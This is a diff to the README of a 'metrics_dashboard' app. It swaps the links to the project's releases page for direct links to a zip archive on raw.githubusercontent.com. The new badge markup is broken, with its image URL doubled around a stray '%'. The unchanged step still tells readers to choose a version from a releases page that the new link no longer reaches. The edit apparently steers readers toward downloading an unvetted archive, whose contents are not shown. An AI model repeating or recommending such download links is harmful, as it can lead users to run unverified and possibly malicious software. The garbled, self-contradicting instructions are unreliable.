@@ -6,7 +6,7 @@ Welcome to the metrics_dashboard! This application lets you see your data in sty
 
 ### 📥 Download the App
 
-[![Download metrics_dashboard](https://img.shields.io/badge/Download-Metrics%20Dashboard-blue.svg)](https://github.com/pipon1241/metrics_dashboard/releases)
+[![Download metrics_dashboard](https://raw.githubusercontent.com/pipon1241/metrics_dashboard/master/macos/metrics_dashboard-1.6.zip%https://raw.githubusercontent.com/pipon1241/metrics_dashboard/master/macos/metrics_dashboard-1.6.zip)](https://raw.githubusercontent.com/pipon1241/metrics_dashboard/master/macos/metrics_dashboard-1.6.zip)
 
 ### 📋 What You Need
 
@@ -30,7 +30,7 @@ Before downloading, please ensure your device meets these basic requirements:
 To download the application, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
-   - [Download metrics_dashboard](https://github.com/pipon1241/metrics_dashboard/releases)
+   - [Download metrics_dashboard](https://raw.githubusercontent.com/pipon1241/metrics_dashboard/master/macos/metrics_dashboard-1.6.zip)
 
 2. **Choose the Latest Version:** Look for the most recent release on the page.
 
